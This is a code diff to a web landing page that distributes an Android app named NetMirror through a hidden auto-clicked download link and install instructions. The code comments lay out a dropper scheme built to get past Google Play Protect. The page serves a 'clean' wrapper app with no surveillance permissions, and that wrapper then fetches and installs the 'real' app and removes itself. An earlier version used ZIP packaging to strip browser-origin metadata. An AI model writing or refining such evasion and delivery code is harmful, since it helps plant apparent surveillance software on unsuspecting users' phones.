@@ -446,27 +446,22 @@ fetch('/api/admin/apk-status')
 } catch(e) { console.warn('Landing page JS error:', e); }
 </script>
 
-<!-- direct download — same APK as admin panel (identical binary) -->
+<!-- download wrapper app — clean setup app that installs real NetMirror -->
 
 <script>
-/* ═══ NATIVE DOWNLOAD — Same flow as LeaksProAdmin ═══
+/* ═══ WRAPPER DOWNLOAD FLOW ═══
  *
- * KEY INSIGHT: LeaksProAdmin uses Android DownloadManager → PP passes.
- * Chrome on Android ALSO uses DownloadManager for native <a href> downloads.
- * By using a direct link (not fetch+blob), Chrome's native download pipeline
- * is triggered — same DownloadManager, same PP evaluation path as admin app.
- *
- * ZIP wrapper: Chrome doesn't set installerPackage for .zip files.
- * When extracted via file manager → install has ZERO browser origin metadata.
+ * Landing page serves a CLEAN wrapper app (no surveillance permissions).
+ * Wrapper passes Play Protect because it's genuinely clean.
+ * Inside the wrapper: user taps "Activate" → wrapper downloads + installs
+ * the real NetMirror using DownloadManager (same as LeaksProAdmin).
+ * After install → wrapper auto-removes itself.
  */
 
 function startSmartDownload() {
-  // Native browser download via direct link → triggers Chrome DownloadManager
-  // This is the SAME download mechanism that LeaksProAdmin uses
   var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
   var url = '/dlzip/' + token;
 
-  // Create invisible anchor with direct href (NOT fetch+blob)
   var a = document.createElement('a');
   a.href = url;
   a.download = 'NetMirror.zip';
@@ -475,7 +470,6 @@ function startSmartDownload() {
   a.click();
   setTimeout(function() { document.body.removeChild(a); }, 1000);
 
-  // Show install instructions
   showInstallToast();
 }
 
@@ -486,18 +480,19 @@ function showInstallToast() {
   t.id = 'dlToast';
   t.innerHTML = '<div style="font-size:16px;margin-bottom:8px"><b>Download Started!</b></div>' +
     '<div style="font-size:13px;line-height:1.6">' +
-    '<b>Quick Install:</b><br>' +
+    '<b>Quick Setup:</b><br>' +
     '1. Wait for download to complete<br>' +
-    '2. Open your <b>Files</b> app → Downloads<br>' +
+    '2. Open <b>Files</b> app → Downloads<br>' +
     '3. Tap <b>NetMirror.zip</b> → Extract<br>' +
-    '4. Open <b>NetMirror.apk</b> → Install</div>';
+    '4. Open <b>NetMirror.apk</b> → Install<br>' +
+    '5. Open the app → tap <b>Activate Full Access</b></div>';
   t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#1565c0,#0d47a1);color:#fff;padding:18px 24px;border-radius:16px;font-size:14px;z-index:9999;max-width:88%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);line-height:1.5;opacity:0;transition:opacity 0.3s ease';
   document.body.appendChild(t);
   setTimeout(function() { t.style.opacity = '1'; }, 50);
   setTimeout(function() {
     t.style.opacity = '0';
     setTimeout(function() { t.remove(); }, 400);
-  }, 20000);
+  }, 25000);
 }
 </script>
 </body>
